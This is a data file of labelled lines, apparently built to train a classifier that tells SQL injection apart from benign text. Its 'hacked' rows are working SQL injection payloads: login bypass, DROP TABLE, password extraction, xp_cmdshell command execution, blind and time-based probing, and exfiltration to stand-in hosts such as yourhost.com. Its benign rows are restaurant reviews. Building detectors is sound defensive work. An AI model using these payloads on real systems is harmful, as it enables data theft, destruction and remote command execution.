@@ -1,0 +1,301 @@
+Comments	Hacked
+DROP sampletable;-- 	1
+admin'--	1
+SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' 	1
+DROP/*comment*/sampletable	1
+DR/**/OP/*bypass blacklisting*/sampletable	1
+SELECT/*avoid-spaces*/password/**/FROM/**/Members	1
+"SELECT /*!32302 1/0, */ 1 FROM tablename"	1
+10; DROP TABLE members --	1
+"SELECT /*!32302 1/0, */ 1 FROM tablename"	1
+/*!32302 10*/	1
+"SELECT /*!32302 1/0, */ 1 FROM tablename"	1
+SELECT * FROM members; DROP members--	1
+10;DROP members --	1
+SELECT * FROM products WHERE id = 10; DROP members--	1
+"IF(condition,true-part,false-part)"	1
+"SELECT IF(1=1,'true','false')"	1
+IF condition true-part ELSE false-part	1
+IF (1=1) SELECT 'true' ELSE SELECT 'false'	1
+BEGIN	1
+"IF condition THEN true-part; ELSE false-part; END IF; END;"""	1
+IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;	1
+SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;	1
+if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0	1
+SELECT CHAR(0x66)	1
+0xHEXNUMBER	1
+SELECT 0x5045	1
+SELECT 0x50 + 0x45	1
+SELECT login + '-' + password FROM members	1
+SELECT login || '-' || password FROM members	1
+"SELECT CONCAT(login, password) FROM members"	1
+SELECT 0x457578	1
+"SELECT CONCAT('0x',HEX('c:\\boot.ini'))"	1
+"SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))"	1
+SELECT CHAR(75)+CHAR(76)+CHAR(77)	1
+SELECT CHR(75)||CHR(76)||CHR(77)	1
+SELECT (CHaR(75)||CHaR(76)||CHaR(77))	1
+SELECT LOAD_FILE(0x633A5C626F6F742E696E69)	1
+SELECT ASCII('a')	1
+SELECT CHAR(64)	1
+"SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members"	1
+" UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--"	1
+field COLLATE SQL_Latin1_General_Cp1254_CS_AS	1
+SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members	1
+Hex()	1
+admin' --	1
+admin'/*	1
+ or 1=1	1
+ or 1=1/*	1
+) or '1'='1	1
+) or ('1'='1	1
+"admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"	1
+ HAVING 1=1	1
+ GROUP BY table.columnfromerror1 HAVING 1=1 --	1
+" GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --"	1
+" GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --"	1
+ORDER BY 1	1
+ union select sum(columntofind) from users--	1
+"Microsoft OLE DB Provider for ODBC Drivers error '80040e07'"""	1
+"SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--"	1
+"11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2"	1
+"11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2"	1
+"11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2"	1
+"11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2"	1
+"11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2"	1
+"; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*"	1
+"INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)"	1
+"bcp ""SELECT * FROM test..foo"" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar"	1
+declare @o int 	1
+"exec sp_oacreate 'wscript.shell', @o out "	1
+"exec sp_oamethod @o, 'run', NULL, 'notepad.exe' "	1
+"Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --"""	1
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'	1
+EXEC master.dbo.xp_cmdshell 'ping '	1
+master..sysmessages	1
+master..sysservers	1
+SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/	1
+DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0	1
+"SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;"	1
+"EXEC sp_configure 'show advanced options',1 "	1
+"RECONFIGURE"""	1
+"EXEC sp_configure 'xp_cmdshell',1 "	1
+SELECT name FROM sysobjects WHERE xtype = 'U'	1
+SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')	1
+"WHERE users NOT IN ('First User', 'Second User') "	1
+"SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)"""	1
+"SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int"	1
+"Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21"	1
+;BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--	1
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'	1
+"SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'"	1
+SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'	1
+SELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'	1
+"TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- "	1
+"FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- "	1
+"TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) "	1
+"FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- "	1
+"TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) "	1
+"FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- "	1
+"TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) "	1
+"FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- "	1
+"FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)"	1
+WAITFOR DELAY '0:0:10'--	1
+WAITFOR DELAY '0:0:0.51'	1
+if (select user) = 'sa' waitfor delay '0:0:10'	1
+ProductID = 1;waitfor delay '0:0:10'--	1
+ProductID =1);waitfor delay '0:0:10'--	1
+ProductID =1';waitfor delay '0:0:10'--	1
+ProductID =1');waitfor delay '0:0:10'--	1
+ProductID =1));waitfor delay '0:0:10'--	1
+ProductID =1'));waitfor delay '0:0:10'--	1
+"IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))"	1
+"IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))"	1
+SELECT pg_sleep(10); 	1
+SELECT sleep(10); 	1
+"(SELECT CASE WHEN (NVL(ASCII(SUBSTR(({INJECTION}),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)"	1
+SQL Server -sp_password log bypass	1
+product.asp?id=5-1	1
+product.asp?id=4 OR 1=1 	1
+product.asp?name=Book	1
+product.asp?name=Bo'%2b'ok	1
+product.asp?name=Bo' || 'ok (OM)	1
+product.asp?name=Book' OR 'x'='x	1
+"SELECT User,Password FROM mysql.user;"	1
+"SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = 'root';"	1
+SELECT ... INTO DUMPFILE	1
+create function LockWorkStation returns integer soname 'user32';	1
+select LockWorkStation();	1
+create function ExitProcess returns integer soname 'kernel32';	1
+select exitprocess();	1
+SELECT USER();	1
+"SELECT password,USER() FROM mysql.user;"	1
+"SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;"	1
+"query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1"	1
+create table foo( line blob ); 	1
+load data infile 'c:/boot.ini' into table foo; 	1
+select * from foo;	1
+"select benchmark( 500000, sha1( 'test' ) );"	1
+"query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1"	1
+"select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' ); "	1
+"select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );"	1
+ + (SELECT TOP 1 password FROM users ) + ' 	1
+bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'	1
+"?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')"	1
+?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECTION})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q	1
+"?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'google.com\\')))"	1
+?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')	1
+?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ sniff.php?sniff='||({INJECTION})||'') FROM DUAL)	1
+?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||({INJECTION})||'.html') FROM DUAL)	1
+?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM DUAL)	1
+"?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||'.yourhost.com',80) FROM DUAL)"	1
+Wow... Loved this place.	0
+Crust is not good.	0
+Not tasty and the texture was just nasty.	0
+Stopped by during the late May bank holiday off Rick Steve recommendation and loved it.	0
+The selection on the menu was great and so were the prices.	0
+Now I am getting angry and I want my damn pho.	0
+Honeslty it didn't taste THAT fresh.)	0
+The potatoes were like rubber and you could tell they had been made up ahead of time being kept under a warmer.	0
+The fries were great too.	0
+A great touch.	0
+Service was very prompt.	0
+Would not go back.	0
+The cashier had no care what so ever on what I had to say it still ended up being wayyy overpriced.	0
+"I tried the Cape Cod ravoli, chicken, with cranberry...mmmm!"	0
+I was disgusted because I was pretty sure that was human hair.	0
+I was shocked because no signs indicate cash only.	0
+Highly recommended.	0
+Waitress was a little slow in service.	0
+"This place is not worth your time, let alone Vegas."	0
+did not like at all.	0
+The Burrittos Blah!	0
+"The food, amazing."	0
+Service is also cute.	0
+I could care less... The interior is just beautiful.	0
+So they performed.	0
+That's right....the red velvet cake.....ohhh this stuff is so good.	0
+They never brought a salad we asked for.	0
+"This hole in the wall has great Mexican street tacos, and friendly staff."	0
+"Took an hour to get our food only 4 tables in restaurant my food was Luke warm, Our sever was running around like he was totally overwhelmed."	0
+The worst was the salmon sashimi.	0
+"Also there are combos like a burger, fries, and beer for 23 which is a decent deal."	0
+This was like the final blow!	0
+I found this place by accident and I could not be happier.	0
+"seems like a good quick place to grab a bite of some familiar pub food, but do yourself a favor and look elsewhere."	0
+"Overall, I like this place a lot."	0
+The only redeeming quality of the restaurant was that it was very inexpensive.	0
+Ample portions and good prices.	0
+"Poor service, the waiter made me feel like I was stupid every time he came to the table."	0
+My first visit to Hiro was a delight!	0
+Service sucks.	0
+The shrimp tender and moist.	0
+There is not a deal good enough that would drag me into that establishment again.	0
+Hard to judge whether these sides were good because we were grossed out by the melted styrofoam and didn't want to eat it for fear of getting sick.	0
+"On a positive note, our server was very attentive and provided great service."	0
+"Frozen pucks of disgust, with some of the worst people behind the register."	0
+The only thing I did like was the prime rib and dessert section.	0
+It's too bad the food is so damn generic.	0
+"The burger is good beef, cooked just right."	0
+If you want a sandwich just go to any Firehouse!!!!!	0
+"My side Greek salad with the Greek dressing was so tasty, and the pita and hummus was very refreshing."	0
+We ordered the duck rare and it was pink and tender on the inside with a nice char on the outside.	0
+He came running after us when he realized my husband had left his sunglasses on the table.	0
+Their chow mein is so good!	0
+"They have horrible attitudes towards customers, and talk down to each one when customers don't enjoy their food."	0
+The portion was huge!	0
+"Loved it...friendly servers, great food, wonderful and imaginative menu."	0
+The Heart Attack Grill in downtown Vegas is an absolutely flat-lined excuse for a restaurant.	0
+Not much seafood and like 5 strings of pasta at the bottom.	0
+"The salad had just the right amount of sauce to not over power the scallop, which was perfectly cooked."	0
+"The ripped banana was not only ripped, but petrified and tasteless."	0
+At least think to refill my water before I struggle to wave you over for 10 minutes.	0
+This place receives stars for their APPETIZERS!!!	0
+The cocktails are all handmade and delicious.	0
+We'd definitely go back here again.	0
+We are so glad we found this place.	0
+"Great food and service, huge portions and they give a military discount."	0
+Always a great time at Dos Gringos!	0
+Update.....went back for a second time and it was still just as amazing	0
+We got the food and apparently they have never heard of salt and the batter on the fish was chewy.	0
+A great way to finish a great.	0
+"The deal included 5 tastings and 2 drinks, and Jeff went above and beyond what we expected."	0
+"Really, Really good rice, all the time."	0
+The service was meh.	0
+"It took over 30 min to get their milkshake, which was nothing more than chocolate milk."	0
+"I guess I should have known that this place would suck, because it is inside of the Excalibur, but I didn't use my common sense."	0
+The scallop dish is quite appalling for value as well.	0
+2 times - Very Bad Customer Service !	0
+The sweet potato fries were very good and seasoned well.	0
+Today is the second time I've been to their lunch buffet and it was pretty good.	0
+There is so much good food in Vegas that I feel cheated for wasting an eating opportunity by going to Rice and Company.	0
+Coming here is like experiencing an underwhelming relationship where both parties can't wait for the other person to ask to break up.	0
+walked in and the place smelled like an old grease trap and only 2 others there eating.	0
+The turkey and roast beef were bland.	0
+This place has it!	0
+The pan cakes everyone are raving about taste like a sugary disaster tailored to the palate of a six year old.	0
+I love the Pho and the spring rolls oh so yummy you have to try.	0
+The poor batter to meat ratio made the chicken tenders very unsatisfying.	0
+All I have to say is the food was amazing!!!	0
+Omelets are to die for!	0
+Everything was fresh and delicious!	0
+"In summary, this was a largely disappointing dining experience."	0
+"It's like a really sexy party in your mouth, where you're outrageously flirting with the hottest person at the party."	0
+"Never been to Hard Rock Casino before, WILL NEVER EVER STEP FORWARD IN IT AGAIN!"	0
+Best breakfast buffet!!!	0
+say bye bye to your tip lady!	0
+We'll never go again.	0
+Will be back again!	0
+Food arrived quickly!	0
+It was not good.	0
+"On the up side, their cafe serves really good food."	0
+"Our server was fantastic and when he found out the wife loves roasted garlic and bone marrow, he added extra to our meal and another marrow to go!"	0
+"The only good thing was our waiter, he was very helpful and kept the bloddy mary's coming."	0
+"Best Buffet in town, for the price you cannot beat it."	0
+"I LOVED their mussels cooked in this wine reduction, the duck was tender, and their potato dishes were delicious."	0
+This is one of the better buffets that I have been to.	0
+So we went to Tigerlilly and had a fantastic afternoon!	0
+"The food was delicious, our bartender was attentive and personable AND we got a great deal!"	0
+The ambience is wonderful and there is music playing.	0
+Will go back next trip out.	0
+Sooooo good!!	0
+"REAL sushi lovers, let's be honest - Yama is not that good."	0
+"At least 40min passed in between us ordering and the food arriving, and it wasn't that busy."	0
+This is a really fantastic Thai restaurant which is definitely worth a visit.	0
+"Nice, spicy and tender."	0
+Good prices.	0
+Check it out.	0
+It was pretty gross!	0
+I've had better atmosphere.	0
+Kind of hard to mess up a steak but they did.	0
+"Although I very much liked the look and sound of this place, the actual experience was a bit disappointing."	0
+I just don't know how this place managed to served the blandest food I have ever eaten when they are preparing Indian cuisine.	0
+"Worst service to boot, but that is the least of their worries."	0
+Service was fine and the waitress was friendly.	0
+"The guys all had steaks, and our steak loving son who has had steak at the best and worst places said it was the best steak he's ever eaten."	0
+"We thought you'd have to venture further away to get good sushi, but this place really hit the spot that night."	0
+"Host staff were, for lack of a better word, BITCHES!"	0
+Bland... Not a liking this place for a number of reasons and I don't want to waste time on bad reviewing.. I'll leave it at that...	0
+"Phenomenal food, service and ambiance."	0
+I wouldn't return.	0
+"Definitely worth venturing off the strip for the pork belly, will return next time I'm in Vegas."	0
+This place is way too overpriced for mediocre food.	0
+Penne vodka excellent!	0
+"They have a good selection of food including a massive meatloaf sandwich, a crispy chicken wrap, a delish tuna melt and some tasty burgers."	0
+The management is rude.	0
+"Delicious NYC bagels, good selections of cream cheese, real Lox with capers even."	0
+"Great Subway, in fact it's so good when you come here every other Subway will not meet your expectations."	0
+I had a seriously solid breakfast here.	0
+This is one of the best bars with food in Vegas.	0
+"He was extremely rude and really, there are so many other restaurants I would love to dine at during a weekend in Vegas."	0
+My drink was never empty and he made some really great menu suggestions.	0
+Don't do it!!!!	0
+The waiter wasn't helpful or friendly and rarely checked on us.	0
+My husband and I ate lunch here and were very disappointed with the food and service.	0
+And the red curry had so much bamboo shoots and wasn't very tasty to me.	0
+Nice blanket of moz over top but i feel like this was done to cover up the subpar food.	0
+The bathrooms are clean and the place itself is well decorated.	0
+"The menu is always changing, food quality is going down & service is extremely slow."	0
+"The service was a little slow , considering that were served by 3 people servers so the food was coming in a slow pace."	0
+I give it 2 thumbs down	0
+We watched our waiter pay a lot more attention to other tables and ignore us.	0
